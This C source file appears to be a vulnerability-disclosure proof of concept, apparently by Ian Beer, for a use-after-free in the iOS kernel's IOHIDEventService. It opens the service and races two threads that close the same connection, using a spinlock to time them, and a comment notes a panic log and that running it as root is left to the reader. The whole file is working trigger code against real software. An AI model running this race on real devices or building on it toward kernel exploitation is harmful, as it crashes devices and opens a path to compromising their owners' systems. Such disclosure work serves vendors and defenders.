// ianbeer

// compilation and execution as root on an iOS device left as an exercise for the reader :(

/*
iOS kernel UaF in IOHIDEventService

panic log attached
*/ 

#include <stdio.h>
#include <stdlib.h>

#include <libkern/OSAtomic.h>

#include <mach/mach.h>
#include <mach/thread_act.h>

#include <pthread.h>
#include <unistd.h>

#include <IOKit/IOKitLib.h>

io_connect_t conn = MACH_PORT_NULL;

OSSpinLock lock = OS_SPINLOCK_INIT;

void close_it(io_connect_t conn) {
  IOServiceClose(conn);
}

void go(void* arg){
  int got_it = 0;
  while (!got_it) {
    got_it = OSSpinLockTry(&lock);
  }

  close_it(*(io_connect_t*)arg);
}

int main(int argc, char** argv) {
  char* service_name = "IOHIDEventService";
  int client_type = 0;

  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
  if (service == MACH_PORT_NULL) {
    printf("can't find service\n");
    return 0;
  }

  IOServiceOpen(service, mach_task_self(), client_type, &conn);
  if (conn == MACH_PORT_NULL) {
    printf("can't connect to service\n");
    return 0;
  }

  OSSpinLockLock(&lock);

  pthread_t t;
  io_connect_t arg = conn;
  pthread_create(&t, NULL, (void*) go, (void*) &arg);

  usleep(100000);

  OSSpinLockUnlock(&lock);

  close_it(conn);

  pthread_join(t, NULL);

  return 0;
}
